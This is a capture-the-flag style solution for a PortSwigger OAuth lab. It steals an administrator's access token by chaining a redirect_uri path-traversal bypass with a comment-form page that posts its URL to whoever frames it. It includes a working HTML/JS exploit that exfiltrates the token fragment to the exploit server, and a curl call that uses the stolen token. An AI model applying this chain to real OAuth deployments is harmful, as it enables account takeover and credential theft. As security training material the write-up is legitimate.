# Solution: stealing OAuth access tokens via a proxy page

Two flaws are chained: the OAuth service validates `redirect_uri` with a check that path traversal
defeats, and the client's comment form forwards its own URL (fragment included) to whoever framed it.

1. **Discover the OAuth request.** `GET /social-login` answers with a `meta http-equiv=refresh`
   pointing at the authorization endpoint:

   ```text
   https://oauth-<id>.oauth-server.net/auth?client_id=<id>
     &redirect_uri=https://<lab-id>.web-security-academy.net/oauth-callback
     &response_type=token&nonce=<n>&scope=openid%20profile%20email
   ```

   `client_id`, the OAuth host and the scope all come from this URL.

2. **Find the proxy page.** `GET /post/comment/comment-form` returns a page whose inline script is:

   ```js
   parent.postMessage({type: 'onload', data: window.location.href}, '*')
   ```

   `window.location.href` keeps the `#access_token=...` fragment, so any page that frames this one
   receives the token.

3. **Abuse `redirect_uri` validation.** The service accepts a redirect URI that starts with the
   registered callback but then escapes it with a traversal segment:

   ```text
   https://<lab-id>.web-security-academy.net/oauth-callback/../post/comment/comment-form
   ```

   A request to the authorization endpoint with that value renders the normal sign-in/consent flow
   (i.e. it is *not* rejected), so the token-bearing redirect lands on the proxy page. Use a fresh
   `nonce` per request; reusing one makes the provider answer with `SessionNotFound`.

4. **Deliver the exploit.** Store this body on the exploit server and click *Deliver exploit to
   victim*. The form answers `302 /deliver-to-victim` — the bot is only triggered when that redirect
   is followed, so a client that stops at the 302 delivers nothing:

   ```html
   <script>
   window.addEventListener('message', function(e) {
     fetch('/?d=' + encodeURIComponent(JSON.stringify(e.data)), {mode:'no-cors'});
   }, false);
   </script>
   <iframe src="https://oauth-<id>.oauth-server.net/auth?client_id=<id>
     &redirect_uri=https://<lab-id>.web-security-academy.net/oauth-callback/../post/comment/comment-form
     &response_type=token&nonce=<fresh>&scope=openid%20profile%20email"></iframe>
   ```

   The administrator's browser already has an OAuth session, so the authorize request redirects
   immediately; the framed proxy page posts its URL — fragment included — to the exploit page, which
   writes it into the exploit server's access log.

5. **Harvest and use the token.** Poll `GET https://exploit-<id>.exploit-server.net/log` and take the
   `access_token` out of the newest victim entry (only entries appended *after* your delivery count,
   otherwise an old token from a previous run is picked up). Then:

   ```bash
   curl -s -H "Authorization: Bearer $TOKEN" https://oauth-<id>.oauth-server.net/me
   # {"sub":"administrator","apikey":"...","email":"administrator@normal-user.net",...}
   ```

6. **Submit and verify.** `POST /submitSolution` with `answer=<apikey>` must return
   `{"correct":true}`, and the lab page must show `widgetcontainer-lab-status is-solved`.

Run it automated:

```bash
uv run python solve.py --url "https://YOUR-LAB-ID.web-security-academy.net/"
```

Through the repository launcher:

```bash
cd /root/Desktop/PortSwigger_Labs && uv run python solve.py --url "https://YOUR-LAB-ID.web-security-academy.net/"
```

Measured on a fresh instance: the automated run completed in **6.05 s with 12 HTTP requests**
(discovery → traversal probe → store → deliver + follow `/deliver-to-victim` → harvest → `/me` →
submit → status check). A previously solved instance reports 5.4 s / 10 requests because it
short-circuits before exploiting.

Notes for reproduction:

- The victim browser only visits while the lab is **unsolved**. After the lab flips to solved, further
  deliveries are recorded as `302` but the bot never loads the page — `--force` will then report
  "no fresh token", which is expected behaviour, not a solver bug.
- The exploit page must be re-*stored* with a new `nonce` before each attempt; a cached page reuses
  the old nonce and the provider refuses the flow.
